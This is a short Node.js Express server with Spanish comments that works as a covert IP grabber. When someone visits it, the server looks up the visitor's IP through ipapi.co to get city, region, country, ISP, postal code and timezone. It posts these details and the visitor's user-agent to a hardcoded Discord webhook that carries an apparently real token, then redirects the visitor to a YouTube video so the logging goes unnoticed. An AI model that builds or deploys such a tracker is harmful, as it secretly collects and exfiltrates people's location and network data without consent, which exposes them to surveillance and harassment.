const express = require("express");
const fetch = require("node-fetch"); // en Node 18+ puedes usar el fetch nativo
const app = express();

const PORT = process.env.PORT || 3000;

const REAL_YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI"; // <-- tu webhook aquí

async function getIPInfo(ip) {
  try {
    const res = await fetch(`https://ipapi.co/${ip}/json/`);
    return await res.json();
  } catch (err) {
    console.error("Error al obtener info de IP:", err);
    return {};
  }
}

async function sendToDiscord(info, userAgent, timestamp) {
  const message = {
    content: `📡 **Nueva visita detectada**

🕒 Hora (UTC): ${timestamp}
🌐 IP: \`${info.ip}\`
🏙️ Ciudad: ${info.city}, ${info.region}
🌍 País: ${info.country_name}
🏢 ISP: ${info.org}
📦 ASN: ${info.asn}
📫 Código Postal: ${info.postal}
🕰️ Zona Horaria: ${info.timezone}
🧭 User-Agent:
\`\`\`${userAgent}\`\`\``
  };

  await fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(message)
  });
}

app.get("/", async (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();

  const info = await getIPInfo(ip);
  info.ip = ip; // Ensure IP is included even if API fails

  await sendToDiscord(info, userAgent, timestamp);

  console.log(`[+] Visita de ${ip} enviada a Discord`);

  res.redirect(REAL_YOUTUBE_URL);
});

app.listen(PORT, () => {
  console.log(`Servidor activo en el puerto ${PORT}`);
});
